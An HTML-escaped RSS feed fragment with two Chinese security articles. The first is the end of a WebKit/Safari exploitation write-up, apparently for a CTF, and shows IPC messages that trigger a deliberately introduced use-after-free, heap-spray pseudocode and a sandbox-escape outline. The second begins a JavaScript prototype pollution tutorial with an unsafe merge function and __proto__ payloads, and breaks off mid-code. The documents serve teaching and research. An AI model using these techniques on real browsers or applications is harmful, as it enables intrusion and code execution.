data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;609&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;609&quot; data-original=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;609&quot; data-rawheight=&quot;647&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;609&quot; data-original=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-bcfd602672681079f086bc3de1722656_b.jpg&quot;/&gt;&lt;figcaption&gt;图3. 泄露StructureID。(蓝色代表伪造的对象，绿色代表正常的对象)&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;我们给出了一个泄露structureID的&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/41d80298dc276d22d1efcc2b63a4ccf93266ed68/leakid.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;代码实现&lt;/a&gt;,执行效果如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;➜  ./jsc pwn.js
Structure ID: 8230700009a5e&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;绕过JSC 隔离堆并执行任意代码&lt;/h2&gt;&lt;p&gt;大家经常使用的绕过隔离堆的方法有两个，&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/LinusHenze/WebKit-RegEx-Exploit/blob/master/pwn.js%23L176&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;WASM’s Memory buffer&lt;/a&gt;或者是&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html%23L128&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Object’s butterfly&lt;/a&gt;。因为gigacage没有对它们做隔离。因为我们在泄露structureID还可以顺便泄露butterfly指针，向图4描绘的这样，用第二种方法在butterfly上伪造一个对象来实现任意地址读写可以少写很多代码。&lt;/p&gt;&lt;p&gt;从任意地址读写到代码执行，我们使用了覆盖JIT代码内存的陈词滥调。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;280&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;795&quot; data-original=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;280&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;795&quot; data-original=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-831be9cdbf273890308dd046123ac91d_b.jpg&quot;/&gt;&lt;figcaption&gt;图4. 通过在butterfly上面伪造一个对象来绕过gigacage隔离堆。&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;攻击WebKit IPC进程并逃逸沙箱&lt;/h2&gt;&lt;p&gt;由于现代浏览器广泛使用了多进程模型以及沙箱墨香，Broker进程IPC便成为了最有力的沙箱逃逸攻击面之一。Chrome Windows在最近的一次成功沙箱逃逸便是利用了Broker IPC的内存破坏。&lt;/p&gt;&lt;p&gt;如图5中阐述，WebKit的Broker IPC server由多个消息代理组合而成，可以双向通信，同步或者异步通信。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;541&quot; data-rawheight=&quot;373&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;541&quot; data-original=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;541&quot; data-rawheight=&quot;373&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;541&quot; data-original=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-13f61e2d9d4d9690b930cc1c255ed723_b.jpg&quot;/&gt;&lt;figcaption&gt;图5. 渲染进程与其他进程的交互。&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;一个UI进程中的Use-After-Free漏洞的故事&lt;/h2&gt;&lt;p&gt;通过回滚AAPL的一个&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.github.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/3b605cbb50324ad5f45a651ad9fe93145c03a412/sandbox.diff&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;patch&lt;/a&gt;，我们在Webkit IPC进程中引入了一个bug。我们删掉了VideoFullScreenMessageProxy::setHasVideo中对contextID的检查。这样一来选手们在触发漏洞的时候就可以轻松点。不停的触发这一条消息就能触发漏洞。&lt;/p&gt;&lt;p&gt;如图6中描述，这些消息Proxy都是通过WTF::HashMap来建议contextID和一些对象之间的映射。因为WTF::HashMap中，0这个index实际上是表示这个位置是空的。但是我们把这个ID的检查删掉了。这样就可以给它发ID为0的消息，造成存入和查找的逻辑不一致。想办法多存一点来触发哈希表的rehash，这个过程会有UAF的情况出现。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1273&quot; data-rawheight=&quot;310&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1273&quot; data-original=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1273&quot; data-rawheight=&quot;310&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1273&quot; data-original=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-705fe50daf15727bb62c0e354fee8005_b.jpg&quot;/&gt;&lt;figcaption&gt;图 6. 危险的裸指针&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;由于指向PlaybackSessionModel的这个指针是裸指针，因此在触发rehash时它将变为悬空指针。 一旦VideoFullscreenInterfaceMac对象被解构，则将触发UAF。&lt;/p&gt;&lt;p&gt;通过向UI进程发送以下消息可以触发UAF。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;send(Messages::VideoFullscreenManagerProxy::SetHasVideo(2, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(-3, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(255, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(7, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(4095, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(0, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(18, true));
send(Messages::VideoFullscreenManagerProxy::SetHasVideo(800, true));&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;稳定的在UI进程中实现堆喷射&lt;/h2&gt;&lt;p&gt;当考虑如何在CPP编写的软件中利用UAF漏洞的时候，我们一般要考虑伪造的虚表往哪里放，伪造的虚表地址如何才能知道。因为macOS的堆比较弱，所以我们用堆喷来实现。&lt;/p&gt;&lt;p&gt;虽然通常都是找一个消息发多次的方式来实现堆喷，但是我们在这里直接用了web进程和UI进程之间的共享内存来实现。如此一来，只需要发一条消息。&lt;/p&gt;&lt;p&gt;伪代码如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;WebProcess::singleton().parentProcessConnection()-&amp;gt;sendSync(
    Messages::WebPasteboardProxy::
        SetPasteboardBufferForType(&amp;#34;name&amp;#34;, &amp;#34;type&amp;#34;, handle, 0x10000000), 
    Messages::WebPasteboardProxy::
        SetPasteboardBufferForType::Reply(newChangeCount), 0);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;靠谱儿的重新填充被释放的内存&lt;/h2&gt;&lt;p&gt;WebAuthenticatorCoordinatorProxy这部分有一个函数带有一个Vector&amp;lt;uint8_t&amp;gt;参数，既是Byte粒度的控制，又没有杂质，简直是填充任何对象的万灵药！&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;void WebAuthenticatorCoordinatorProxy::makeCredential(FrameIdentifier frameId, 
    SecurityOriginData&amp;amp;&amp;amp; origin, 
    Vector&amp;lt;uint8_t&amp;gt;&amp;amp;&amp;amp; hash, 
    PublicKeyCredentialCreationOptions&amp;amp;&amp;amp; options, 
    RequestCompletionHandler&amp;amp;&amp;amp; handler) {
    handleRequest({ WTFMove(hash), 
        WTFMove(options), 
        makeWeakPtr(m_webPageProxy), 
        WebAuthenticationPanelResult::Unavailable, 
        nullptr, 
        GlobalFrameIdentifier 
        { 
            m_webPageProxy.webPageID(), 
            frameId 
        }, 
        WTFMove(origin) 
        }, 
        WTFMove(handler));
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;伪代码如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sendWithAsyncReply(Messages::WebAuthenticatorCoordinatorProxy::MakeCredential(
        m_mainFrame-&amp;gt;frameID(), 
        SecurityOriginData(&amp;#34;http&amp;#34;, &amp;#34;hqzhao.me&amp;#34;, 8080), hash, options), 
        callback
);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;老生常谈: 劫持虚表并在沙箱外执行任意代码&lt;/h2&gt;&lt;p&gt;图7描绘了整个沙箱逃逸的过程，一如既往的劫持虚标，一如既往的栈迁移，一如既往的调用setcontext的gadget。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1518&quot; data-rawheight=&quot;839&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1518&quot; data-original=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1518&quot; data-rawheight=&quot;839&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1518&quot; data-original=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-a994e440f09f15f99a36d066f4d7c808_b.jpg&quot;/&gt;&lt;figcaption&gt;图7。 从UAF到沙箱逃逸&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;班主任评语&lt;/h2&gt;&lt;p&gt;以上在macOS上的利用确实冗长，枯燥又乏味。虽然整个心路历程不算那么的容易，但是如今Safari和WebKit的漏洞利用技术的前沿和重心应该还是在iOS上。不说iOS的JIT上辈子就不能修改了，也不说iOS的随机化强多了，也不说iOS13的沙箱配置文件连BSD syscall都开始禁了，光是自从iPhone有了PAC以来，还没有公开技术来讨论在任意地址读写后如何在content中执行代码。不管是用户态还是内核态，大家A12平台以后的exploit除了逻辑漏洞，基本都是在靠着漏洞品相和环境特性在做Data-Only相关的attack。如文章中说的这些陈词滥调，应该会慢慢从主流软件中绝迹。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>赵汉青</author>
<guid isPermaLink="false">2019-12-14-96069221</guid>
<pubDate>Sat, 14 Dec 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>深入理解 JavaScript Prototype 污染攻击</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-28-61990774.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/61990774&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-14cbccbc6a4bbb99662a0894ee226b0a_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;JavaScript是一门非常灵活的语言，我感觉在某些方面可能比PHP更加灵活。所以，除了传统的SQL注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如今天要说这个prototype污染。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x01-prototype__proto__&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x01 prototype和__proto__分别是什么？&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 } new Foo() &lt;/p&gt;&lt;p&gt;&lt;code&gt;Foo&lt;/code&gt;函数的内容，就是&lt;code&gt;Foo&lt;/code&gt;类的构造函数，而&lt;code&gt;this.bar&lt;/code&gt;就是&lt;code&gt;Foo&lt;/code&gt;类的一个属性。&lt;/p&gt;&lt;blockquote&gt;为了简化编写JavaScript代码，ECMAScript 6后增加了&lt;code&gt;class&lt;/code&gt;语法，但&lt;code&gt;class&lt;/code&gt;其实只是一个语法糖。&lt;/blockquote&gt;&lt;p&gt;一个类必然有一些方法，类似属性&lt;code&gt;this.bar&lt;/code&gt;，我们也可以将方法定义在构造函数内部：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new Foo()).show() &lt;/p&gt;&lt;p&gt;但这样写有一个问题，就是每当我们新建一个Foo对象时，&lt;code&gt;this.show = function...&lt;/code&gt;就会执行一次，这个&lt;code&gt;show&lt;/code&gt;方法实际上是绑定在对象上的，而不是绑定在“类”中。&lt;/p&gt;&lt;p&gt;我希望在创建类的时候只创建一次&lt;code&gt;show&lt;/code&gt;方法，这时候就则需要使用原型（prototype）了：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;325&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;325&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们可以认为原型&lt;code&gt;prototype&lt;/code&gt;是类&lt;code&gt;Foo&lt;/code&gt;的一个属性，而所有用&lt;code&gt;Foo&lt;/code&gt;类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的&lt;code&gt;foo&lt;/code&gt;对象，其天生就具有&lt;code&gt;foo.show()&lt;/code&gt;方法。&lt;/p&gt;&lt;p&gt;我们可以通过&lt;code&gt;Foo.prototype&lt;/code&gt;来访问&lt;code&gt;Foo&lt;/code&gt;类的原型，但&lt;code&gt;Foo&lt;/code&gt;实例化出来的对象，是不能通过prototype访问原型的。这时候，就该&lt;code&gt;__proto__&lt;/code&gt;登场了。&lt;/p&gt;&lt;p&gt;一个Foo类实例化出来的foo对象，可以通过&lt;code&gt;foo.__proto__&lt;/code&gt;属性来访问Foo类的原型，也就是说：&lt;/p&gt;&lt;p&gt;foo.__proto__ == Foo.prototype &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot; data-rawwidth=&quot;340&quot; data-rawheight=&quot;103&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image&quot; width=&quot;340&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot; data-rawwidth=&quot;340&quot; data-rawheight=&quot;103&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image lazy&quot; width=&quot;340&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;所以，总结一下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;prototype&lt;/code&gt;是一个类的属性，所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法&lt;/li&gt;&lt;li&gt;一个对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向这个对象所在的类的&lt;code&gt;prototype&lt;/code&gt;属性&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x02-javascript&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x02 JavaScript原型链继承&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法，这个特性被用来实现JavaScript中的继承机制。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;p&gt;function Father() { this.first_name = &amp;#39;Donald&amp;#39; this.last_name = &amp;#39;Trump&amp;#39; } function Son() { this.first_name = &amp;#39;Melania&amp;#39; } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) &lt;/p&gt;&lt;p&gt;Son类继承了Father类的&lt;code&gt;last_name&lt;/code&gt;属性，最后输出的是&lt;code&gt;Name: Melania Trump&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;总结一下，对于对象son，在调用&lt;code&gt;son.last_name&lt;/code&gt;的时候，实际上JavaScript引擎会进行如下操作：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在对象son中寻找last_name&lt;/li&gt;&lt;li&gt;如果找不到，则在&lt;code&gt;son.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;&lt;li&gt;如果仍然找不到，则继续在&lt;code&gt;son.__proto__.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;&lt;li&gt;依次寻找，直到找到&lt;code&gt;null&lt;/code&gt;结束。比如，&lt;code&gt;Object.prototype&lt;/code&gt;的&lt;code&gt;__proto__&lt;/code&gt;就是&lt;code&gt;null&lt;/code&gt; &lt;/li&gt;&lt;/ol&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;296&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;296&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。&lt;/p&gt;&lt;p&gt;以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;每个构造函数(constructor)都有一个原型对象(prototype)&lt;/li&gt;&lt;li&gt;对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向类的原型对象&lt;code&gt;prototype&lt;/code&gt;&lt;/li&gt;&lt;li&gt;JavaScript使用prototype链实现继承机制&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x03&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x03 原型链污染是什么&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;第一章中说到，&lt;code&gt;foo.__proto__&lt;/code&gt;指向的是&lt;code&gt;Foo&lt;/code&gt;类的&lt;code&gt;prototype&lt;/code&gt;。那么，如果我们修改了&lt;code&gt;foo.__proto__&lt;/code&gt;中的值，是不是就可以修改Foo类呢？&lt;/p&gt;&lt;p&gt;做个简单的实验：&lt;/p&gt;&lt;p&gt;// foo是一个简单的JavaScript对象 let foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) &lt;/p&gt;&lt;p&gt;最后，虽然zoo是一个&lt;b&gt;空&lt;/b&gt;对象&lt;code&gt;{}&lt;/code&gt;，但&lt;code&gt;zoo.bar&lt;/code&gt;的结果居然是2：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;440&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;537&quot; data-original=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;440&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;537&quot; data-original=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;原因也显而易见：因为前面我们修改了foo的原型&lt;code&gt;foo.__proto__.bar = 2&lt;/code&gt;，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。&lt;/p&gt;&lt;p&gt;后来，我们又用Object类创建了一个zoo对象&lt;code&gt;let zoo = {}&lt;/code&gt;，zoo对象自然也有一个bar属性了。&lt;/p&gt;&lt;p&gt;那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是&lt;b&gt;原型链污染&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x04&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x04 哪些情况下原型链会被污染？&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？&lt;/p&gt;&lt;p&gt;我们思考一下，哪些情况下我们可以设置&lt;code&gt;__proto__&lt;/code&gt;的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对象merge&lt;/li&gt;&lt;li&gt;对象clone（其实内核就是将待操作的对象merge到一个空对象中）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;以对象merge为例，我们想象一个简单的merge函数：&lt;/p&gt;&lt;p&gt;function merge(target, source) { for (let key in source) { if (key in source &amp;amp;&amp;amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } &lt;/p&gt;&lt;p&gt;在合并的过程中，存在赋值的操作&lt;code&gt;target[key] = source[key]&lt;/code&gt;，那么，这个key如果是&lt;code&gt;__proto__&lt;/code&gt;，是不是就可以原型链污染呢？&lt;/p&gt;&lt;p&gt;我们用如下代码实验一下：&lt;/p&gt;&lt;p&gt;let o1 = {} let o2 = {a: 1, &amp;#34;__proto__&amp;#34;: {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) &lt;/p&gt;&lt;p&gt;结果是，合并虽然成功了，但原型链没有被污染：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;500&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;624&quot; data-original=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;500&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;624&quot; data-original=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;这是因为，我们用JavaScript创建o2的过程（&lt;code&gt;let o2 = {a: 1, &amp;#34;__proto__&amp;#34;: {b: 2}}&lt;/code&gt;）中，&lt;code&gt;__proto__&lt;/code&gt;已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是&lt;code&gt;[a, b]&lt;/code&gt;，&lt;code&gt;__proto__&lt;/code&gt;并不是一个key，自然也不会修改Object的原型。&lt;/p&gt;&lt;p&gt;那么，如何让&lt;code&gt;__proto__&lt;/code&gt;被认为是一个键名呢？&lt;/p&gt;&lt;p&gt;我们将代码改成如下：&lt;/p&gt;&lt;p&gt;let o1 = {} let o2 = JSON.parse(&amp;#39;{&amp;#34;a&amp;#34;: 1, &amp;#34;__proto__&amp;#34;: 